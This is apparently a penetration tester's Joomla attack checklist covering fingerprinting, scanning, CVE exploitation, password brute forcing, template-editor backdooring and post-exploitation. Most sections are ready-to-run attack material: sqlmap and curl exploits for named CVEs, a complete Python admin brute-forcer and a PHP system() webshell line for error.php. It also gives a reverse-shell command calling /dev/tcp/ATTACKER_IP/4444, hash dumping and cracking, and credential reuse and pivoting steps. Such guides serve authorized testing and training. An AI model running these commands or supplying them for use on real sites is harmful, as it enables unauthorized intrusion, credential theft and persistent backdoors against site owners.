# Joomla Methodology

> **Context:** Joomla is the second most popular CMS after WordPress. The admin panel at `/administrator/` is a high-value target -- authenticated access almost always leads to RCE via the template editor. The attack surface includes outdated extensions, weak credentials, and known CVEs in the Joomla core.

---

## 1. Discovery & Fingerprinting

- [ ] Check page source for Joomla references
  ```bash
  curl -s http://TARGET/ | grep -i "joomla\|generator"
  ```
  - Look for `<meta name="generator" content="Joomla! X.X" />`

- [ ] Retrieve `robots.txt` for directory enumeration hints
  ```bash
  curl -s http://TARGET/robots.txt
  ```
  - Common disallowed paths: `/administrator/`, `/bin/`, `/cache/`, `/cli/`, `/components/`, `/includes/`, `/installation/`, `/language/`, `/layouts/`, `/libraries/`, `/logs/`, `/modules/`, `/plugins/`, `/tmp/`
  - If `/installation/` is accessible, the site may be freshly installed with default creds

- [ ] Get exact version from `joomla.xml`
  ```bash
  curl -s http://TARGET/administrator/manifests/files/joomla.xml | xmllint --xpath '//version/text()' -
  ```

- [ ] Fallback version fingerprinting
  ```bash
  # README.txt (often exposes version)
  curl -s http://TARGET/README.txt | head -5

  # Language XML
  curl -s http://TARGET/language/en-GB/en-GB.xml | grep "version"

  # Cache plugin XML
  curl -s http://TARGET/plugins/system/cache/cache.xml | grep "version"
  ```

- [ ] Check `/media/system/js/` for JavaScript files that leak version info
  ```bash
  curl -s http://TARGET/media/system/js/ | grep -oP 'href="[^"]*"'
  ```

- [ ] Identify installed components by probing common paths
  ```bash
  # Quick check for common vulnerable components
  for comp in com_content com_users com_fields com_media com_contact com_finder; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" http://TARGET/index.php?option=$comp)
    echo "$comp: $CODE"
  done
  ```

**Decision point:**
- Version < 3.4.5 --> check CVE-2015-8562 (PHP object injection, unauthenticated RCE)
- Version 3.7.0 --> check CVE-2017-8917 (SQLi)
- Version 3.x with Media Manager --> check CVE-2019-10945 (directory traversal)
- Version 4.0.0 - 4.2.7 --> check CVE-2023-23752 (unauthenticated info disclosure)

---

## 2. Automated Scanning

### droopescan

- [ ] Install and run droopescan
  ```bash
  pip install droopescan
  droopescan scan joomla --url http://TARGET
  ```
  - Enumerates: version, plugins, themes, interesting URLs
  - Fast but sometimes misses components

### JoomScan (OWASP)

- [ ] Run JoomScan with component enumeration
  ```bash
  # Basic scan
  joomscan -u http://TARGET

  # With component enumeration (slower, more thorough)
  joomscan -u http://TARGET -ec

  # Set cookies if needed (e.g., behind auth)
  joomscan -u http://TARGET -ec --cookie "name=value"
  ```
  - Checks for: known CVEs, admin panel exposure, directory listings, config leaks, backup files
  - Output includes vulnerable component versions

### Manual Component Enumeration

- [ ] Brute-force component names
  ```bash
  # Wordlist approach -- checks HTTP response codes for installed components
  while read comp; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://TARGET/index.php?option=$comp")
    if [ "$CODE" != "404" ]; then
      echo "[+] Found: $comp ($CODE)"
    fi
  done < /usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/joomla-components.txt
  ```

---

## 3. CVE Exploits (Unauthenticated)

### CVE-2017-8917 -- SQL Injection (Joomla 3.7.0)

- [ ] Test for SQLi in `com_fields`
  ```bash
  sqlmap -u "http://TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
    --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
  ```
  - Affects only Joomla 3.7.0 (very specific version)
  - Can dump database including admin hashes

### CVE-2023-23752 -- Unauthenticated Information Disclosure (Joomla 4.0.0 - 4.2.7)

- [ ] Leak database credentials and site config
  ```bash
  # Get database credentials
  curl -s "http://TARGET/api/index.php/v1/config/application?public=true" | python3 -m json.tool

  # Get user information
  curl -s "http://TARGET/api/index.php/v1/users?public=true" | python3 -m json.tool
  ```
  - Returns `dbtype`, `host`, `user`, `password`, `db` in cleartext
  - If MySQL is exposed externally, connect directly

### CVE-2015-8562 -- PHP Object Injection (Joomla 1.5.x - 3.4.5)

- [ ] Unauthenticated RCE via User-Agent header
  ```bash
  # Search for exploit
  searchsploit joomla 3.4.5
  searchsploit -m 47465

  # Or use Metasploit
  msfconsole -q -x "use exploit/multi/http/joomla_http_header_rce; set RHOSTS TARGET; set LHOST ATTACKER_IP; run"
  ```

### CVE-2019-10945 -- Directory Traversal / Arbitrary File Upload (Joomla 3.x)

- [ ] Exploit Media Manager path traversal
  ```bash
  # Requires low-privilege authenticated session (not admin)
  # Upload a webshell to an accessible directory by traversing out of upload dir
  # The vulnerability is in the Media Manager file upload API

  # Step 1: Authenticate and get session cookie
  # Step 2: Use the Media Manager API with path traversal
  curl -X POST "http://TARGET/index.php?option=com_media&task=file.upload" \
    -H "Cookie: YOUR_SESSION_COOKIE" \
    -F "file=@shell.php" \
    -F "folder=/../../../tmp"
  ```
  - Allows writing files outside intended upload directory
  - Can read sensitive files via traversal
  - Check [Joomla Security Advisory 20190401](https://developer.joomla.org/security-centre/)

---

## 4. Brute Force Login

- [ ] Identify admin login panel
  ```bash
  curl -s -o /dev/null -w "%{http_code}" http://TARGET/administrator/
  ```

- [ ] Extract CSRF token from login form (required for brute force)
  ```bash
  # Joomla login requires a CSRF token -- must extract it per request
  curl -s http://TARGET/administrator/ | grep -oP 'name="[a-f0-9]{32}" value="1"' | grep -oP '[a-f0-9]{32}'
  ```

- [ ] Brute force with custom Python script
  ```python
  #!/usr/bin/env python3
  """joomla-brute.py -- Joomla admin brute forcer with CSRF handling"""
  import requests
  import re
  import sys

  target = sys.argv[1]  # http://TARGET
  wordlist = sys.argv[2]  # /path/to/wordlist
  username = sys.argv[3] if len(sys.argv) > 3 else "admin"

  login_url = f"{target}/administrator/index.php"
  s = requests.Session()

  with open(wordlist, 'r', errors='ignore') as f:
      for password in f:
          password = password.strip()
          # Get fresh CSRF token
          resp = s.get(login_url)
          token = re.findall(r'name="([a-f0-9]{32})" value="1"', resp.text)
          if not token:
              print("[-] Could not find CSRF token")
              break
          data = {
              "username": username,
              "passwd": password,
              "option": "com_login",
              "task": "login",
              token[0]: "1"
          }
          resp = s.post(login_url, data=data, allow_redirects=False)
          if resp.status_code == 303 and "administrator/index.php" in resp.headers.get("Location", ""):
              print(f"[+] FOUND: {username}:{password}")
              break
          else:
              print(f"[-] Failed: {username}:{password}")
  ```
  ```bash
  python3 joomla-brute.py http://TARGET /usr/share/wordlists/rockyou.txt admin
  ```

- [ ] Alternative: Hydra (if CSRF token can be handled)
  ```bash
  # Joomla CSRF tokens make Hydra tricky -- the Python script above is more reliable
  # If the target has no CSRF protection (unlikely but possible):
  hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form \
    "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Username and password do not match"
  ```

**Escalation:** Got creds --> proceed to Section 5 (Template Editor RCE)

---

## 5. Authenticated RCE -- Template Editor

This is the primary post-auth escalation path. Admin access to Joomla almost always means RCE.

### Joomla 3.x

- [ ] Navigate to template editor
  - `Extensions` --> `Templates` --> `Templates` (left sidebar)
  - Select active template (e.g., `protostar` -- check the star icon for default)
  - Click template name to open file editor

- [ ] Choose a file to backdoor
  - Best target: `error.php` (rarely cached, always accessible)
  - Alternative: `index.php` of the template (but may break site)

- [ ] Insert webshell with obfuscated parameter
  ```bash
  # Generate an MD5 hash for the GET parameter name (obfuscation)
  echo -n "pwned" | md5sum
  # Result: dcfdd5e021a869fcc6dfaef8bf31377e
  ```

- [ ] Add this line to the top of `error.php` (after `<?php`):
  ```php
  system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
  ```

- [ ] Test command execution
  ```bash
  curl -s "http://TARGET/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
  ```

- [ ] Get reverse shell
  ```bash
  # URL-encode the payload, then:
  curl -s "http://TARGET/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"

  # Or use a one-liner (start listener first)
  nc -nlvp 4444
  ```

### Joomla 4.x / 5.x

- [ ] Template editor location changed
  - `System` --> `Site Templates` --> Select template (e.g., `Cassiopeia`)
  - Click template name --> file editor opens
  - Same technique: inject `system()` into `error.php`

- [ ] Webshell path for Joomla 4.x+
  ```bash
  curl -s "http://TARGET/templates/cassiopeia/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
  ```

### Alternative: Plugin Upload

- [ ] Upload a malicious plugin (if template editor is locked down)
  - Create a minimal Joomla plugin ZIP containing a PHP webshell
  - `Extensions` --> `Manage` --> `Install` --> upload ZIP
  - Access the shell at `/plugins/system/yourplugin/yourplugin.php`

---

## 6. Post-Exploitation

- [ ] Grab database credentials from `configuration.php`
  ```bash
  cat /var/www/html/configuration.php | grep -E '^\s+public \$(host|user|password|db|dbprefix)'
  ```
  - Key variables: `$host`, `$user`, `$password`, `$db`, `$dbprefix`

- [ ] Dump password hashes from database
  ```bash
  # Connect to MySQL with extracted creds
  mysql -u DBUSER -p'DBPASS' -h localhost DBNAME

  # Dump user hashes (default table prefix is jos_ or a random string)
  SELECT username, password, email FROM jos_users;
  # Or if prefix is different:
  SHOW TABLES LIKE '%users';
  ```

- [ ] Crack Joomla hashes
  ```bash
  # Joomla 3.x uses bcrypt ($2y$)
  # Joomla 2.x used MD5 with salt (md5:salt format)
  hashcat -m 3200 joomla_hashes.txt /usr/share/wordlists/rockyou.txt
  ```

- [ ] Check for credential reuse
  - [ ] Try DB creds for SSH login
  - [ ] Try DB creds for other services on the box
  - [ ] Try admin password against other user accounts

- [ ] Look for sensitive files
  ```bash
  # Backup files that may contain old configs
  find /var/www -name "*.bak" -o -name "*.old" -o -name "*.save" -o -name "configuration.php-dist" 2>/dev/null

  # Log files
  cat /var/www/html/administrator/logs/error.php 2>/dev/null
  ls -la /var/www/html/logs/
  ```

- [ ] Check for other sites on the same box (virtual hosts, shared hosting)
  ```bash
  ls /var/www/
  cat /etc/apache2/sites-enabled/*
  cat /etc/nginx/sites-enabled/*
  ```

---

## 7. Decision Tree

```
Joomla Found
├── 1. Fingerprint version
│   ├── /administrator/manifests/files/joomla.xml
│   ├── README.txt
│   └── Page source generator tag
│
├── 2. Automated scanning
│   ├── droopescan scan joomla --url TARGET
│   └── joomscan -u TARGET -ec
│
├── 3. Version-based CVE check
│   ├── 1.5.x - 3.4.5 --> CVE-2015-8562 (unauth RCE via User-Agent)
│   ├── 3.7.0 ---------> CVE-2017-8917 (SQLi in com_fields)
│   ├── 3.x -----------> CVE-2019-10945 (dir traversal, needs low-priv auth)
│   └── 4.0 - 4.2.7 ---> CVE-2023-23752 (unauth info disclosure --> DB creds)
│
├── 4. Brute force /administrator/
│   ├── Got creds?
│   │   ├── YES --> Template Editor --> webshell in error.php --> RCE
│   │   └── NO  --> Deeper CVE research, extension vulns
│   └── Default creds: admin:admin, admin:password, admin:joomla
│
├── 5. Post-exploit
│   ├── configuration.php --> DB creds
│   ├── Database --> user hashes --> hashcat
│   ├── Credential reuse --> SSH / other services
│   └── Pivot to other hosts / sites
```

---

## Quick Reference

| Item | Path / Command |
|------|----------------|
| Admin panel | `/administrator/` |
| Version (XML) | `/administrator/manifests/files/joomla.xml` |
| Config file | `configuration.php` (web root) |
| Default template (3.x) | `protostar` at `/templates/protostar/` |
| Default template (4.x+) | `cassiopeia` at `/templates/cassiopeia/` |
| User table | `{prefix}_users` |
| Hash type (3.x+) | bcrypt `$2y$` -- hashcat mode `3200` |
| droopescan | `droopescan scan joomla --url TARGET` |
| JoomScan | `joomscan -u TARGET -ec` |

---

## External References

- [Joomla Security Centre](https://developer.joomla.org/security-centre.html) -- official security advisories
- [HackTricks - Joomla](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla) -- community pentest notes
- [OWASP JoomScan](https://github.com/OWASP/joomscan) -- GitHub repository
- [droopescan](https://github.com/SamJoan/droopescan) -- CMS scanner
- [CVE-2023-23752 PoC](https://github.com/Acceis/exploit-CVE-2023-23752) -- info disclosure exploit
